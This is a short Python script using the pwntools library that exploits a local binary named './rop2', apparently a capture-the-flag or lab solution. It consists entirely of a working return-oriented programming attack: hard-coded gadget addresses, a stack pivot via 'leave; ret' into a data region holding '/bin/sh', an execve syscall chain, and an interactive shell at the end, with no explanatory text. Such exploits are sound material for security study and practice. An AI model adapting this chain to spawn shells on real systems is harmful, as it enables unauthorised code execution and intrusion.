from pwn import *

context.arch = "amd64"

p = process( './rop2' )

sh = b'/bin/sh\x00'

pop_rax_rdx_rbx = 0x0000000000478616
pop_rsi = 0x0000000000401637
pop_rdi = 0x0000000000401516
pop_rdx = 0x00000000004428e6
syscall = 0x00000000004003da
leave_ret = 0x00000000004009e4
data = 0x6ccd60
#read = 0x43f4b0

payload = b'a' * 32

#buf1 = 0x6cc000 - 0x200
#buf2 = buf1 + 0x100

#read( 0, buf1, 0x100 )
rop1 = flat( [ data + 0x8, leave_ret ] )
rop2 = flat( [ data + 300, pop_rsi, 0, pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdi, data, syscall ] )

p.send( sh + rop2 )

raw_input()
p.send( payload + rop1 )

p.interactive()
